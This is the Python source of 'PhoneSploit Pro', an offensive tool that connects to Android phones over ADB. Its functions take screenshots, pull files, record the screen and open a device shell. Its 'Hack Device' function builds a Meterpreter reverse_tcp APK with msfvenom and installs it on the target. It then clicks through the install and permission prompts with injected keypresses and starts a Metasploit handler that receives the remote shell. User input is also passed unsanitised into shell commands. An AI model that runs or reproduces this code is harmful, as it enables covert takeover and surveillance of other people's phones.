import os
import random
import socket
import time
import subprocess
import platform
from banner import banner_list
from banner import instructions_banner
from banner import hacking_banner


def check_packages():
    adb_status = subprocess.call(['which', 'adb'])
    if adb_status != 0:
        print('\nERROR : ADB is NOT installed!\n')
        print('\nPlease install Android-Tools (adb) to continue.\n')
        exit_phonesploit_pro()

    metasploit_status = subprocess.call(['which', 'msfconsole'])
    if metasploit_status != 0:
        print('\nERROR : Metasploit-Framework is NOT installed!\n')
        print('\nPlease install Metasploit-Framework to continue.\n')
        exit_phonesploit_pro()

    python_version = platform.python_version()
    if python_version < '3.10':
        print("\nPlease update Python to version 3.10 or higher to run this program.\n")
        exit_phonesploit_pro()

    operating_system = platform.system()
    if operating_system == 'Windows':
        print('\nWindows is currently not supported.\n')
        exit_phonesploit_pro()


def display_menu():
    ''' Displays a random banner and menu'''
    print(random.choice(banner_list))  # Prints a random banner
    menu = '''

    1. Connect a device             6. Get screenshot                11. Run an app
    2. List connected devices       7. List installed apps           12. Uninstall an app   
    3. Disconnect all devices       8. Download file from device     13. Screen Record     
    4. Access device shell          9. Send file to device           14. Restart device
    5. Stop ADB server             10. Install an APK                15. Hack Device (Using Metasploit)
    
    '''
    print(menu)


def clear_screen():
    ''' Clears the screen and display menu '''
    os.system("clear")
    display_menu()


def connect():
    print("\n")
    os.system("adb tcpip 5555")
    print("\nEnter target phone's IP Address.       Example : 192.168.1.23")
    ip = input("> ")
    os.system("adb connect " + ip + ":5555")


def list_devices():
    print("\n")
    os.system("adb devices -l")
    print("\n")


def disconnect():
    print("\n")
    os.system("adb disconnect")
    print("\n")


def exit_phonesploit_pro():
    global run_phonesploit_pro
    run_phonesploit_pro = False
    print("\nExiting...\n")


def get_shell():
    print("\n")
    os.system("adb shell")


def get_screenshot():
    os.system("adb shell screencap -p /sdcard/screen.png")
    print("\nEnter location to save screenshot, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        print("\nSaving screenshot to PhoneSploit-Pro directory...\n")
    os.system(f"adb pull /sdcard/screen.png {destination}")
    print("\n")


def stop_adb():
    os.system("adb kill-server")
    print("\nStopped ADB Server")


def pull_file():
    location = input("\nEnter file path : /sdcard/")
    print("\nEnter location to save file, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        print("\nSaving file to PhoneSploit-Pro directory...\n")
    os.system("adb pull /sdcard/" + location + " " + destination)


def push_file():
    location = input("\nEnter file path : ")
    destination = input("Enter destination path : /sdcard/")
    os.system("adb push " + location + " /sdcard/" + destination)


def install_app():
    file_location = input("\nEnter apk path : ")
    os.system("adb install " + file_location)
    print("\n")


def uninstall_app():
    print("\nEnter package name.     Example : com.spotify.music ")
    package_name = input("> ")
    os.system("adb uninstall " + package_name)
    print("\n")


def launch_app():
    print("\nEnter package name.     Example : com.spotify.music ")
    package_name = input("> ")

    os.system("adb shell monkey -p " + package_name + " 1")
    print("\n")


def list_apps():
    print('''

    1 - List third party packages
    2 - List all packages
    ''')
    mode = int(input("> "))
    if mode == 1:
        os.system("adb shell pm list packages -3")
    elif mode == 2:
        os.system("adb shell pm list packages")
    print("\n")


def screenrecord():
    time = input("\nEnter the recording duration (in seconds) > ")
    print('\nStarting Screen Recording...\n')
    os.system(
        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/demo.mp4")
    print("\nEnter location to save video, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        print("\nSaving video to PhoneSploit-Pro directory...\n")
    os.system(f"adb pull /sdcard/demo.mp4 {destination}")
    print("\n")


def reboot():
    os.system('adb reboot')
    print('\n')


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def instructions():
    os.system('clear')
    instruction = '''

This attack will launch Metasploit Framework             i.e msfconsole

Use 'Ctrl + C' to stop at any point

1. Wait until you see:
    
    meterpreter >

2. Then use 'help' command to see all meterpreter commands:

    meterpreter > help

3. To exit meterpreter enter 'exit' or To Metasploit enter 'exit -y':

    meterpreter > exit

    msf6 > exit -y
     
[PhoneSploit Pro]   Press 'Enter' to continue attack
    '''
    print(instructions_banner + instruction)
    input('> ')


def hack():
    instructions()
    print(hacking_banner)
    ip = get_ip_address()  # getting IP Address to create payload
    print(f"\nUsing IP Address : {ip} to create payload\n")
    print("\nCreating APK...\n")
    # creaating payload
    os.system(
        f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
    print("\nInstalling APK to target device...\n")
    # installing apk to device (used & to execute command in background)
    os.system("adb install test.apk &")
    time.sleep(5)  # waiting for apk to be installed

    # Keyboard input to accept app install
    print("\nSending input 1\n")
    os.system('adb shell input keyevent 20')
    os.system('adb shell input keyevent 20')
    os.system('adb shell input keyevent 66')

    print("\nLaunching app...\n")
    package_name = "com.metasploit.stage"  # payload package name
    os.system("adb shell monkey -p " + package_name + " 1")
    time.sleep(3)  # waiting for app to launch

    # Keyboard input to accept app permissions
    print("\nSending input 2\n")
    os.system('adb shell input keyevent 22')
    os.system('adb shell input keyevent 22')
    os.system('adb shell input keyevent 66')

    # Launching Metasploit
    os.system(
        f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit ; help'")


def main():

    # Clearing the screen and presenting the menu
    # taking selction input from user
    print("\n 99 : Clear Screen                0 : Exit")
    option = int(input("\n[Main Menu] Enter selection > "))

    match option:
        case 0:
            exit_phonesploit_pro()
        case 99:
            clear_screen()
        case 1:
            connect()
        case 2:
            list_devices()
        case 3:
            disconnect()
        case 4:
            get_shell()
        case 5:
            stop_adb()
        case 6:
            get_screenshot()
        case 7:
            list_apps()
        case 8:
            pull_file()
        case 9:
            push_file()
        case 10:
            install_app()
        case 11:
            launch_app()
        case 12:
            uninstall_app()
        case 13:
            screenrecord()
        case 14:
            reboot()
        case 15:
            hack()
        case other:
            print("\nInvalid selection!\n")


# Starting point of the program
run_phonesploit_pro = True
check_packages()
if run_phonesploit_pro:
    clear_screen()
    while run_phonesploit_pro:
        main()
